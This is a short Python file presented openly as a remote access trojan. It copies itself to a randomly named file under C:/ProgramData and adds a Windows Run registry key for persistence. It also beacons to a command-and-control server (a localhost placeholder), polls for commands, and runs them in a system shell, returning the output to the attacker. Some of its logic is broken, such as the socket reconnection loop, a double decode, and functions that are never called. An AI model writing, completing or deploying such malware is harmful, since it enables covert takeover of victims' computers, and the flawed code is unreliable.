import socket
import os
import subprocess
import platform

def create_rat():
    persistence()
    beaconing()

def persistence():
    # Copy malware to a hidden path and add a "Run" key in the Windows Registry 
    if platform.system() == 'Windows':
        file_path = "C:/ProgramData/" + os.urandom(8).hex()
        subprocess.run(['cmd', '/c', f'copy {os.path.abspath(__file__)} {file_path}'])
        reg_key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        reg_val = os.urandom(16).hex() 
        reg = "HKEY_LOCAL_MACHINE\\" + reg_key
        subprocess.run(['reg', 'add', reg, '/v', reg_val, '/t', 'REG_SZ', '/d', file_path])

    else:
        # For other platforms, we can still persist in a similar way.
        pass

def beaconing():
    # periodically sends a "heartbeat" packet to the C2 server
    server_address = ('127.0.0.1', 1234) 
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        sock.connect(server_address)
        msg = 'Heartbeat'
        send_msg(sock, msg.encode())
        data = receive_msg(sock)
        if not data:
            break
        print(f'Beaconing response: {data}')

def command_polling():
    # receives a command string from the server 
    server_address = ('127.0.0.1', 4321) 
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(server_address)

    msg = 'Requesting commands'
    send_msg(sock, msg.encode())
    data = receive_msg(sock)
    return data.decode()

def execution_return():
    # executes the command using a system shell and sends the output back to the attacker.
    command = command_polling()
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout

def send_msg(sck, msg):
    sck.sendall(msg)

def receive_msg(sck):
    return sck.recv(1024).decode()

if __name__ == "__main__":
    create_rat()
